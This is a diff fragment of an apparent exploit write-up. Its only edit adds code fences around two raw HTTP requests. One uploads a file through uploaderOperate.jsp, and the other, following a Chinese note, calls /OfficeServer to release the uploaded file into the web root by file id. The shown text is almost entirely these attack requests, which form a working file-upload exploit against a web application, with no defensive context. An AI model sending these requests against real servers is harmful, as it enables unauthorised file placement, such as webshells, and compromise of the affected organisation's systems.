@@ -1,3 +1,4 @@
+```text
 POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1
 Host: X.X.X.X
 Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"
@@ -28,9 +29,10 @@ Test
 Content-Disposition: form-data; name="plandetailid"
 1
 ------WebKitFormBoundarymVk33liI64J7GQaK— 
-
+```
 
 2、将文件释放至跟网站根路径下 在数据包中将 fileid 替换
+```
 POST /OfficeServer HTTP/1.1
 Host: X.X.X.X
 Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"
@@ -55,3 +57,4 @@ Content-Length: 207
 Content-Disposition: form-data; name="aaa"
 {'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'20462'}
 ------WebKitFormBoundarymVk33liI64J7GQaK—
+```
